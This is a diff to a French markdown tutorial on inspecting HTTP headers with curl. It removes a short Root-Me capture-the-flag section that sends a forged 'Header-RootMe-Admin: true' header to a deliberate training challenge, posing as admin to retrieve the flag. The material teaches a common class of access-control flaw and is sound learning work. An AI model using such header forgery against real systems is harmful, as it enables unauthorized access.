@@ -104,20 +104,3 @@ Pour analyser une réponse HTTP complète :
 ```bash
 curl -v -H "Mon-Header: valeur" http://site.com
 ```
-
----
-
-## Exemple concret (Challenge Root-Me)
-
-```bash
-# 1. Voir la réponse initiale
-curl -i http://challenge01.root-me.org/web-serveur/ch5/
-
-# 2. Observer les headers personnalisés
-# Header-RootMe-Admin: none
-
-# 3. Modifier le header pour se faire passer pour admin
-curl -i -H "Header-RootMe-Admin: true" http://challenge01.root-me.org/web-serveur/ch5/
-
-# 4. Récupérer le flag dans la réponse !
-```
